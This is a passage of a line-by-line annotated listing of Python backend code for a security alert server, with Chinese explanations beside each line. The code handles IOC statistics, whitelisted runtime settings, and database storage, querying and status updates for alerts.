| 707 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 708 | 条件判断：满足条件时进入对应分支。 | `            if needle:` |
| 709 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                hay = " ".join(` |
| 710 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    [` |
| 711 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        str(item.get("value", "")),` |
| 712 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        str(item.get("reason", "")),` |
| 713 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        str(item.get("note", "")),` |
| 714 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        " ".join(item.get("sources", [])),` |
| 715 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    ]` |
| 716 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ).lower()` |
| 717 | 条件判断：满足条件时进入对应分支。 | `                if needle not in hay:` |
| 718 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 719 | 函数调用：执行已有函数/方法完成当前步骤。 | `            result.append(item)` |
| 720 | 注释：解释下面或当前这段代码的设计意图。 | `        # 按 added_at 降序（最新在前）` |
| 721 | 函数定义：声明 `_added_ts` 的输入、处理逻辑和返回结果。 | `        def _added_ts(e: Dict[str, Any]) -> float:` |
| 722 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ts = _parse_iso(e.get("added_at"))` |
| 723 | 返回结果：把处理后的值交回调用方。 | `            return -ts.timestamp() if ts else 0.0` |
| 724 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 725 | 函数调用：执行已有函数/方法完成当前步骤。 | `        result.sort(key=_added_ts)` |
| 726 | 返回结果：把处理后的值交回调用方。 | `        return result` |
| 727 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 728 | 函数定义：声明 `ioc_stats` 的输入、处理逻辑和返回结果。 | `    def ioc_stats(self) -> Dict[str, Any]:` |
| 729 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        total = len(self._iocs)` |
| 730 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        by_type: Dict[str, int] = {}` |
| 731 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        by_source: Dict[str, int] = {}` |
| 732 | 循环：逐个处理集合或迭代器中的元素。 | `        for item in self._iocs.values():` |
| 733 | 函数调用：执行已有函数/方法完成当前步骤。 | `            by_type[item.get("type", "unknown")] = (` |
| 734 | 函数调用：执行已有函数/方法完成当前步骤。 | `                by_type.get(item.get("type", "unknown"), 0) + 1` |
| 735 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 736 | 循环：逐个处理集合或迭代器中的元素。 | `            for s in item.get("sources", []):` |
| 737 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                by_source[s] = by_source.get(s, 0) + 1` |
| 738 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 739 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "total": total,` |
| 740 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ip_count": by_type.get("ip", 0),` |
| 741 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "domain_count": by_type.get("domain", 0),` |
| 742 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "by_type": by_type,` |
| 743 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "by_source": by_source,` |
| 744 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "updated_at": _now_iso(),` |
| 745 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 746 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 747 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 可写运行时设置 ---------------------------------------------` |
| 748 | 函数定义：声明 `init_settings` 的输入、处理逻辑和返回结果。 | `    def init_settings(self, defaults: Dict[str, Any]) -> None:` |
| 749 | 文档字符串：说明当前模块、类或函数的职责。 | `        """首次启动时用环境默认值填充 _settings。"""` |
| 750 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._settings = dict(defaults)` |
| 751 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 752 | 函数定义：声明 `get_setting` 的输入、处理逻辑和返回结果。 | `    def get_setting(self, key: str, default: Any = None) -> Any:` |
| 753 | 返回结果：把处理后的值交回调用方。 | `        return self._settings.get(key, default)` |
| 754 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 755 | 函数定义：声明 `all_settings` 的输入、处理逻辑和返回结果。 | `    def all_settings(self) -> Dict[str, Any]:` |
| 756 | 返回结果：把处理后的值交回调用方。 | `        return dict(self._settings)` |
| 757 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 758 | 函数定义：声明 `update_settings` 的输入、处理逻辑和返回结果。 | `    def update_settings(self, updates: Dict[str, Any]) -> Dict[str, Any]:` |
| 759 | 文档字符串：说明当前模块、类或函数的职责。 | `        """原子合并：仅白名单字段会被写入。"""` |
| 760 | 循环：逐个处理集合或迭代器中的元素。 | `        for k, v in updates.items():` |
| 761 | 条件判断：满足条件时进入对应分支。 | `            if k in SETTINGS_EDITABLE_KEYS:` |
| 762 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self._settings[k] = v` |
| 763 | 返回结果：把处理后的值交回调用方。 | `        return self.all_settings()` |
| 764 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 765 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 766 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 767 | 注释：解释下面或当前这段代码的设计意图。 | `# DB helpers（R2：告警接口数据库优先，保留内存态兼容）` |
| 768 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 769 | 函数定义：声明 `_dt_iso` 的输入、处理逻辑和返回结果。 | `def _dt_iso(value: Optional[datetime]) -> Optional[str]:` |
| 770 | 条件判断：满足条件时进入对应分支。 | `    if not value:` |
| 771 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 772 | 返回结果：把处理后的值交回调用方。 | `    return value.astimezone().isoformat(timespec="seconds")` |
| 773 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 774 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 775 | 函数定义：声明 `_alert_to_api_dict` 的输入、处理逻辑和返回结果。 | `def _alert_to_api_dict(alert: Alert) -> Dict[str, Any]:` |
| 776 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    history = sorted(` |
| 777 | 函数调用：执行已有函数/方法完成当前步骤。 | `        list(alert.histories),` |
| 778 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        key=lambda h: h.created_at.timestamp() if h.created_at else 0,` |
| 779 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 780 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 781 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "id": alert.id,` |
| 782 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "external_id": alert.external_id,` |
| 783 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "timestamp": _dt_iso(alert.timestamp) or _now_iso(),` |
| 784 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "source_ip": alert.source_ip or "",` |
| 785 | 注释：解释下面或当前这段代码的设计意图。 | `        # 兼容前端既有字段命名` |
| 786 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "target_ip": alert.target_ip or "",` |
| 787 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "dest_ip": alert.target_ip or "",` |
| 788 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "threat_type": alert.threat_type or "unknown",` |
| 789 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": alert.level or "low",` |
| 790 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "confidence": alert.confidence,` |
| 791 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "engine": alert.engine,` |
| 792 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "status": alert.status or "open",` |
| 793 | 注释：解释下面或当前这段代码的设计意图。 | `        # Phase 7 前端依赖 title，当前先复用 summary` |
| 794 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "title": alert.summary or "未分类告警",` |
| 795 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "summary": alert.summary or "",` |
| 796 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "raw_payload": alert.raw_payload,` |
| 797 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_version": alert.model_version,` |
| 798 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "created_at": _dt_iso(alert.created_at),` |
| 799 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "updated_at": _dt_iso(alert.updated_at),` |
| 800 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "history": [` |
| 801 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 802 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "status": item.to_status,` |
| 803 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "from_status": item.from_status,` |
| 804 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "operator": item.operator,` |
| 805 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "note": item.note,` |
| 806 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "timestamp": _dt_iso(item.created_at),` |
| 807 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 808 | 循环：逐个处理集合或迭代器中的元素。 | `            for item in history` |
| 809 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ],` |
| 810 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 811 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 812 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 813 | 函数定义：声明 `_upsert_alert_to_db` 的输入、处理逻辑和返回结果。 | `def _upsert_alert_to_db(alert_payload: Dict[str, Any]) -> Optional[Alert]:` |
| 814 | 文档字符串：说明当前模块、类或函数的职责。 | `    """把标准化告警写入 DB（同 id 幂等更新）。"""` |
| 815 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id = str(alert_payload.get("id") or "").strip()` |
| 816 | 条件判断：满足条件时进入对应分支。 | `    if not alert_id:` |
| 817 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 818 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 819 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ts = _parse_iso(str(alert_payload.get("timestamp") or "")) or datetime.now(timezone.utc)` |
| 820 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item = db.session.get(Alert, alert_id)` |
| 821 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    is_new = item is None` |
| 822 | 条件判断：满足条件时进入对应分支。 | `    if item is None:` |
| 823 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        item = Alert(id=alert_id, timestamp=ts, source_ip=str(alert_payload.get("source_ip") or ""))` |
| 824 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(item)` |
| 825 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.external_id = str(alert_payload.get("external_id") or "") or None` |
| 826 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.timestamp = ts` |
| 827 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.source_ip = str(alert_payload.get("source_ip") or "")` |
| 828 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.target_ip = str(alert_payload.get("target_ip") or alert_payload.get("dest_ip") or "") or None` |
| 829 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.threat_type = str(alert_payload.get("threat_type") or "unknown")` |
| 830 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.level = str(alert_payload.get("level") or "low")` |
| 831 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    conf = alert_payload.get("confidence")` |
| 832 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.confidence = float(conf) if isinstance(conf, (int, float)) else None` |
| 833 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.engine = str(alert_payload.get("engine") or "") or None` |
| 834 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.status = str(alert_payload.get("status") or "open")` |
| 835 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.summary = str(alert_payload.get("summary") or alert_payload.get("title") or "") or None` |
| 836 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw = alert_payload.get("raw_payload", alert_payload.get("raw"))` |
| 837 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.raw_payload = str(raw) if raw not in (None, "") else None` |
| 838 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    item.model_version = str(alert_payload.get("model_version") or "") or None` |
| 839 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 840 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.flush()` |
| 841 | 条件判断：满足条件时进入对应分支。 | `    if is_new:` |
| 842 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(` |
| 843 | 函数调用：执行已有函数/方法完成当前步骤。 | `            AlertHistory(` |
| 844 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=item.id,` |
| 845 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                from_status=None,` |
| 846 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                to_status=item.status,` |
| 847 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                operator="system",` |
| 848 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                note="alert_ingested",` |
| 849 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 850 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 851 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 852 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 853 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except IntegrityError:` |
| 854 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.rollback()` |
| 855 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        existing = db.session.get(Alert, alert_id)` |
| 856 | 条件判断：满足条件时进入对应分支。 | `        if existing is not None:` |
| 857 | 返回结果：把处理后的值交回调用方。 | `            return existing` |
| 858 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ext = str(alert_payload.get("external_id") or "").strip()` |
| 859 | 条件判断：满足条件时进入对应分支。 | `        if ext:` |
| 860 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dup = db.session.query(Alert).filter(Alert.external_id == ext).one_or_none()` |
| 861 | 条件判断：满足条件时进入对应分支。 | `            if dup is not None:` |
| 862 | 返回结果：把处理后的值交回调用方。 | `                return dup` |
| 863 | 代码语句：参与当前文件的业务流程或数据处理。 | `        raise` |
| 864 | 返回结果：把处理后的值交回调用方。 | `    return item` |
| 865 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 866 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 867 | 函数定义：声明 `normalize_guardian_stream_fields` 的输入、处理逻辑和返回结果。 | `def normalize_guardian_stream_fields(fields: Dict[str, Any]) -> Optional[Dict[str, Any]]:` |
| 868 | 文档字符串：说明当前模块、类或函数的职责。 | `    """将 \`\`guardian:alerts\`\` Stream 字段规范化为与 REST/Socket 一致的告警 dict。` |
| 869 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 870 | 代码语句：参与当前文件的业务流程或数据处理。 | `    缺少 \`\`alert_id\`\` / \`\`id\`\` 的消息无法幂等入库，返回 \`\`None\`\`（调用方应 ack 丢弃以免堵流）。` |
| 871 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 872 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    aid = str(fields.get("alert_id") or fields.get("id") or "").strip()` |
| 873 | 条件判断：满足条件时进入对应分支。 | `    if not aid:` |
| 874 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 875 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    level = str(fields.get("level") or "low")` |
| 876 | 条件判断：满足条件时进入对应分支。 | `    if level not in ALERT_LEVELS:` |
| 877 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level = "low"` |
| 878 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    status = str(fields.get("status") or "open")` |
| 879 | 条件判断：满足条件时进入对应分支。 | `    if status not in ALERT_STATUSES:` |
| 880 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status = "open"` |
| 881 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    threat = str(fields.get("type") or fields.get("threat_type") or "unknown")` |
| 882 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    details = str(fields.get("details") or "").strip()` |
| 883 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ts_raw = fields.get("timestamp")` |
| 884 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ts_str = str(ts_raw).strip() if ts_raw is not None else ""` |
| 885 | 条件判断：满足条件时进入对应分支。 | `    if not ts_str:` |
| 886 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ts_str = _now_iso()` |
| 887 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    conf = fields.get("confidence")` |
| 888 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw_blob = {k: v for k, v in fields.items()}` |
| 889 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 890 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "id": aid,` |
| 891 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "external_id": aid,` |
| 892 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "timestamp": ts_str,` |
| 893 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "source_ip": str(fields.get("source_ip") or "").strip(),` |
| 894 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "target_ip": str(fields.get("target_ip") or fields.get("dest_ip") or "").strip()` |
| 895 | 代码语句：参与当前文件的业务流程或数据处理。 | `        or None,` |
| 896 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "threat_type": threat,` |
| 897 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": level,` |
| 898 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "status": status,` |
| 899 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "title": details or "未分类告警",` |
| 900 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "summary": details or "未分类告警",` |
| 901 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "confidence": float(conf) if isinstance(conf, (int, float)) else None,` |
| 902 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "engine": str(fields.get("engine") or "") or None,` |
| 903 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_version": str(fields.get("model_version") or "") or None,` |
| 904 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "raw_payload": json.dumps(raw_blob, ensure_ascii=False),` |
| 905 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "history": [{"status": status, "timestamp": ts_str}],` |
| 906 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 907 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 908 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 909 | 函数定义：声明 `_query_alerts_from_db` 的输入、处理逻辑和返回结果。 | `def _query_alerts_from_db(` |
| 910 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 911 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    limit: int,` |
| 912 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    offset: int,` |
| 913 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    level: Optional[str],` |
| 914 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    threat_type: Optional[str],` |
| 915 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    status: Optional[str],` |
| 916 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    since: Optional[datetime],` |
| 917 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    until: Optional[datetime],` |
| 918 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    q: Optional[str],` |
| 919 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Tuple[List[Dict[str, Any]], int]:` |
| 920 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    query = db.session.query(Alert)` |
| 921 | 条件判断：满足条件时进入对应分支。 | `    if level:` |
| 922 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(Alert.level == level)` |
| 923 | 条件判断：满足条件时进入对应分支。 | `    if threat_type:` |
| 924 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(Alert.threat_type == threat_type)` |
| 925 | 条件判断：满足条件时进入对应分支。 | `    if status:` |
| 926 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(Alert.status == status)` |
| 927 | 条件判断：满足条件时进入对应分支。 | `    if since:` |
| 928 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(Alert.timestamp >= since)` |
| 929 | 条件判断：满足条件时进入对应分支。 | `    if until:` |
| 930 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(Alert.timestamp <= until)` |
| 931 | 条件判断：满足条件时进入对应分支。 | `    if q:` |
| 932 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        like = f"%{q.strip()}%"` |
| 933 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(` |
| 934 | 函数调用：执行已有函数/方法完成当前步骤。 | `            or_(` |
| 935 | 函数调用：执行已有函数/方法完成当前步骤。 | `                Alert.summary.ilike(like),` |
| 936 | 函数调用：执行已有函数/方法完成当前步骤。 | `                Alert.threat_type.ilike(like),` |
| 937 | 函数调用：执行已有函数/方法完成当前步骤。 | `                Alert.source_ip.ilike(like),` |
| 938 | 函数调用：执行已有函数/方法完成当前步骤。 | `                Alert.target_ip.ilike(like),` |
| 939 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 940 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 941 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 942 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    total = query.count()` |
| 943 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rows = query.order_by(Alert.timestamp.desc()).offset(offset).limit(limit).all()` |
| 944 | 返回结果：把处理后的值交回调用方。 | `    return [_alert_to_api_dict(row) for row in rows], total` |
| 945 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 946 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 947 | 函数定义：声明 `_update_alert_status_in_db` 的输入、处理逻辑和返回结果。 | `def _update_alert_status_in_db(` |
| 948 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    *, alert_id: str, new_status: str, operator: Optional[str], note: Optional[str]` |
| 949 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Optional[Dict[str, Any]]:` |
| 950 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    row = db.session.get(Alert, alert_id)` |
| 951 | 条件判断：满足条件时进入对应分支。 | `    if not row:` |
| 952 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 953 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    prev = row.status` |
| 954 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    row.status = new_status` |
| 955 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.add(` |
| 956 | 函数调用：执行已有函数/方法完成当前步骤。 | `        AlertHistory(` |
| 957 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=alert_id,` |
| 958 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            from_status=prev,` |
| 959 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            to_status=new_status,` |
| 960 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            operator=operator or "operator",` |
| 961 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            note=note or None,` |
| 962 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 963 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 964 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.commit()` |
| 965 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.refresh(row)` |
| 966 | 返回结果：把处理后的值交回调用方。 | `    return _alert_to_api_dict(row)` |
| 967 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 968 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 969 | 函数定义：声明 `_recent_alerts_from_db` 的输入、处理逻辑和返回结果。 | `def _recent_alerts_from_db(` |
| 970 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 971 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    limit: int = 500,` |
| 972 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    since: Optional[datetime] = None,` |
| 973 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    until: Optional[datetime] = None,` |
| 974 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> List[Dict[str, Any]]:` |
| 975 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    query = db.session.query(Alert)` |
| 976 | 条件判断：满足条件时进入对应分支。 | `    if since:` |
| 977 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(Alert.timestamp >= since)` |
| 978 | 条件判断：满足条件时进入对应分支。 | `    if until:` |
| 979 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(Alert.timestamp <= until)` |
| 980 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rows = query.order_by(Alert.timestamp.desc()).limit(limit).all()` |
| 981 | 返回结果：把处理后的值交回调用方。 | `    return [_alert_to_api_dict(row) for row in rows]` |
| 982 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 983 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 984 | 函数定义：声明 `_hydrate_settings_from_db` 的输入、处理逻辑和返回结果。 | `def _hydrate_settings_from_db(state: _ServerState) -> None:` |
| 985 | 文档字符串：说明当前模块、类或函数的职责。 | `    """用数据库中的设置覆盖进程内默认值（生产真源）。"""` |
| 986 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 987 | 循环：逐个处理集合或迭代器中的元素。 | `        for key in SETTINGS_EDITABLE_KEYS:` |
| 988 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = db.session.get(Setting, key)` |
| 989 | 条件判断：满足条件时进入对应分支。 | `            if row is not None and row.value is not None:` |
| 990 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                state._settings[key] = row.value` |
| 991 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:  # noqa: BLE001` |
| 992 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning("[Settings] 从 DB 加载失败，使用进程默认值", exc_info=True)` |
| 993 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 994 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 995 | 函数定义：声明 `_persist_settings_to_db` 的输入、处理逻辑和返回结果。 | `def _persist_settings_to_db(updates: Dict[str, Any]) -> None:` |
| 996 | 循环：逐个处理集合或迭代器中的元素。 | `    for key, val in updates.items():` |
| 997 | 条件判断：满足条件时进入对应分支。 | `        if key not in SETTINGS_EDITABLE_KEYS:` |
| 998 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 999 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = db.session.get(Setting, key)` |
| 1000 | 条件判断：满足条件时进入对应分支。 | `        if row is None:` |
| 1001 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = Setting(key=key)` |
| 1002 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.add(row)` |
| 1003 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.value = val` |
| 1004 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.commit()` |
